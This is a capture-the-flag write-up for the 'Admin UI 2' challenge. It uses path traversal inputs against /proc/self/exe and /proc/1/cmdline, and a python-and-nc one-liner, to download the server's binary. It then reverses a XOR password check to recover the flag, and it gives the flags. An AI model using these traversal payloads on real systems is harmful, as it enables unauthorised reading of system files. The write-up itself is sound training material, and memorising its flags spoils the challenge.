# Admin UI 2

After getting the first password `CTF{I_luv_buggy_sOFtware}` we can now enter it to get
```
! Two factor authentication required !
Please enter secret secondary password:
```

Also, the clallenge encourages us to try to find the binary.
First, I tried inspecting all the interestring `path traversal files` from [Path Traversal Cheat Sheet](https://www.gracefulsecurity.com/path-traversal-cheat-sheet-linux/), but none of the gave me an answer about the name of the binary.

Instead, there are two was of getting this to work

1. `../../../../../../proc/1/cmdline` to get the `./main` cmd.
2. `../../../../../../proc/self/exe` to get the executable.

One of the methods to get it is `python -c "print '2\n../../../../../../proc/self/exe\n'" | nc mngmnt-iface.ctfcompetition.com 1337 > main.bin`

And strip all the useless strings the come before.

We open the binary and see the following code inside `sub_41414446`:
```
len = strlen(input)
for (int i = 0; i < len; i++) 
{
	input[i] ^= 0xC7;
}

if ( len == 35 )
{
	*(_QWORD *)s = 0x98A8B093BC819384LL;
	*(_QWORD *)&s[8] = 0x83B5A8B094B4A697LL;
	*(_QWORD *)&s[16] = 0xB5A2B3B3A28598BDLL;
	*(_QWORD *)&s[24] = 0x98F698A9F3AFB398LL;
	*(_WORD *)&s[32] = 0xF8ACu;
	s[34] = 0xBAu;
}
if ( s ) GRANT ACCESS
```

Notice that it allows us to access their "shell" if the password length is `35` and it doesnt actually check with the hardcoded one, but it doesn't mean we can't see what it is.
Let's extract the values of s `[ '84', '93', '81', 'BC', '93', 'B0', 'A8', '98', '97', 'A6', 'B4', '94', 'B0', 'A8', 'B5', '83', 'BD', '98', '85', 'A2', 'B3', 'B3', 'A2', 'B5', '98', 'B3', 'AF', 'F3', 'A9', '98', 'F6', '98', 'AC', 'F8']`.

Since it was trying to prepare the password for comparing by XOR-ing the input, let's apply the inverse operation that XOR's the stored passsword

```
>>> l = ['84', '93', '81', 'BC', '93', 'B0', 'A8', '98', '97', 'A6', 'B4', '94', 'B0', 'A8', 'B5', '83', 'BD', '98', '85', 'A2', 'B3', 'B3', 'A2', 'B5', '98', 'B3', 'AF', 'F3', 'A9', '98', 'F6', '98', 'AC', 'F8', 'BA']
>>> ''.join([chr(0xC7^int(x,16)) for x in l])
```
And we get the flag `CTF{Two_PasSworDz_Better_th4n_1_k?`

